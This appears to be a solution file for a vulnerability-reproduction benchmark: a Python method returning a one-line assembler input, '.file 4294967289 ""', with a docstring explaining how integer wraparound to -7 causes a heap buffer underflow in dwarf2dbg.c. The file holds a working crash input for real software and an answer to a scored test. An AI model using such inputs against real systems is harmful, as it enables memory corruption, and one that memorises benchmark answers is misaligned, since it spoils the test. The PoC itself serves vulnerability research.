class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in dwarf2dbg.c, specifically
        in the assign_file_to_slot function. It occurs when handling a .file
        directive with a large integer value that overflows a standard 32-bit
        signed integer.

        The PoC uses the number 4294967289. When parsed into a 32-bit signed
        integer, this value wraps around and becomes -7 (since 4294967289 is
        0xFFFFFFF9 in hex). This negative value is then used as an index into
        a heap-allocated array, causing a buffer underflow.

        To create the shortest possible PoC for the highest score, we use
        an empty string for the filename ("") and the necessary directive
        format. The final PoC is `.file 4294967289 ""\n`.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        return b'.file 4294967289 ""\n'